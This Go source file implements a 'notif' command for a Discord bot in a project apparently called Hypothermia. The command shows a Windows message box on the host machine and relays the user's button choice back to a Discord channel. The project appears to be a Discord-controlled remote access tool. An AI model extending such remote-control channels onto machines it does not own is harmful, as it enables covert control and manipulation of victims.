package commands

import (
	"strings"
	"syscall"
	"unsafe"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	notifButtons string = "abort-retry-ignore\ncancel-try_again-continue\nhelp\nok\nok-cancel\nretry-cancel\nyes-no\nyes-no-cancel"
	notifUsage   string = "[text] [title] [button?]\n\nButtons:\n" + notifButtons + "\n\n*separate text and title with quotes"

	notifArgsError    string = "🟥 Expected 2 or more arguments."
	notifConvertError string = "🟥 Failed to convert argument."
)

var msgBox *syscall.LazyProc = misc.User32.NewProc("MessageBoxW")

func (*NotifCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) < 2 {
		s.ChannelMessageSendReply(m.ChannelID, notifArgsError+"\nUsage: "+notifUsage, m.Reference())
		return
	}

	data := utils.GetText(strings.Join(args, " "))

	text, err := syscall.UTF16FromString(data[0])
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, notifConvertError, m.Reference())
		return
	}

	title, err := syscall.UTF16FromString(data[1])
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, notifConvertError, m.Reference())
		return
	}

	var button uint
	if len(args) > 2 {
		button = utils.GetButtonFlag(args[2])
	} else {
		button = utils.MB_OK
	}

	ret, _, _ := msgBox.Call(
		uintptr(0),
		uintptr(unsafe.Pointer(&text[0])),
		uintptr(unsafe.Pointer(&title[0])),
		uintptr(button),
	)

	s.ChannelMessageSendReply(m.ChannelID, utils.GetButtonClicked(ret), m.Reference())
}

func (*NotifCommand) Name() string {
	return "notif"
}

func (*NotifCommand) Info() string {
	return "displays a messagebox"
}

type NotifCommand struct{}
